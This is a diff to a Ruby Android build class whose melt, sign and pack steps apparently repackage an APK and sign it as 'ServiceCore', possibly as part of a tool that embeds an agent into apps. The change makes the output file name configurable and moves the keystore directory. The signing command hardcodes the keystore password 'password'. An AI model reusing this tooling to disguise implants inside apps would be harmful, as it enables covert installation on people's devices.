@@ -49,6 +49,8 @@ class BuildAndroid < Build
   def melt(params)
     trace :debug, "Build: melting: #{params}"
 
+    @appname = params['appname'] || 'install'
+
     apktool = path('apktool.jar')
     apk = path('output.apk')
 
@@ -71,26 +73,26 @@ class BuildAndroid < Build
   end
 
   def sign(params)
-    trace :debug, "Build: signing with #{Config::CONF_DIR}/android.keystore"
+    trace :debug, "Build: signing with #{Config::CERT_DIR}/android.keystore"
 
     apk = path(@outputs.first)
-    core = path('install.apk')
+    core = path(@appname + '.apk')
 
-    system("jarsigner -keystore #{Config::CONF_DIR}/android.keystore -storepass password -keypass password #{apk} ServiceCore")  or raise("cannot sign with jarsigner")
+    system("jarsigner -keystore #{Config::CERT_DIR}/android.keystore -storepass password -keypass password #{apk} ServiceCore")  or raise("cannot sign with jarsigner")
 
     File.chmod(0755, path('zipalign')) if File.exist? path('zipalign')
     CrossPlatform.exec path('zipalign'), "-f 4 #{apk} #{core}" or raise("cannot align apk")
 
     File.delete(apk)
 
-    @outputs = ['install.apk']
+    @outputs = [@appname + '.apk']
   end
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open('install.apk', "w") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
+      z.file.open(@appname + '.apk', "w") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
     end
 
     # this is the only file we need to output after this point
